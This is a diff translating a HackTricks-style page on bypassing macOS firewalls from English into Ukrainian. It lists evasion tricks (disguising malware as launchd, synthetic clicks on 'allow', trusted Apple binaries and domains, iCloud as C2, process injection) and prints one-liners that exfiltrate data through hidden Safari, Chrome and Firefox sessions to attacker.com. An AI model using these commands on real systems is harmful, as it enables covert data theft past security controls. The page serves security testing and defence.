@@ -2,84 +2,74 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## Знайдені техніки
 
-The following techniques were found working in some macOS firewall apps.
+Наступні техніки були виявлені як працюючі в деяких програмах брандмауера macOS.
 
-### Abusing whitelist names
+### Зловживання іменами у білому списку
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Наприклад, викликати шкідливе ПЗ з іменами відомих процесів macOS, таких як **`launchd`**
 
-### Synthetic Click
+### Синтетичний клік
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Якщо брандмауер запитує дозвіл у користувача, змусьте шкідливе ПЗ **натиснути на дозволити**
 
-### **Use Apple signed binaries**
+### **Використовуйте підписані Apple двійкові файли**
 
-- Like **`curl`**, but also others like **`whois`**
+- Як **`curl`**, але також інші, такі як **`whois`**
 
-### Well known apple domains
+### Відомі домени Apple
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Брандмауер може дозволяти з'єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.
 
-### Generic Bypass
+### Загальний обхід
 
-Some ideas to try to bypass firewalls
+Деякі ідеї для спроби обійти брандмауери
 
-### Check allowed traffic
+### Перевірка дозволеного трафіку
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Знання дозволеного трафіку допоможе вам виявити потенційно включені в білий список домени або які програми мають доступ до них.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Зловживання DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS-резолюції виконуються через **`mdnsreponder`** підписаний додаток, який, ймовірно, буде дозволено контактувати з DNS-серверами.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Через браузерні додатки
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Firefox
-
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Через ін'єкції процесів
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+Якщо ви можете **ін'єктувати код у процес**, який має право підключатися до будь-якого сервера, ви можете обійти захист брандмауера:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Посилання
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
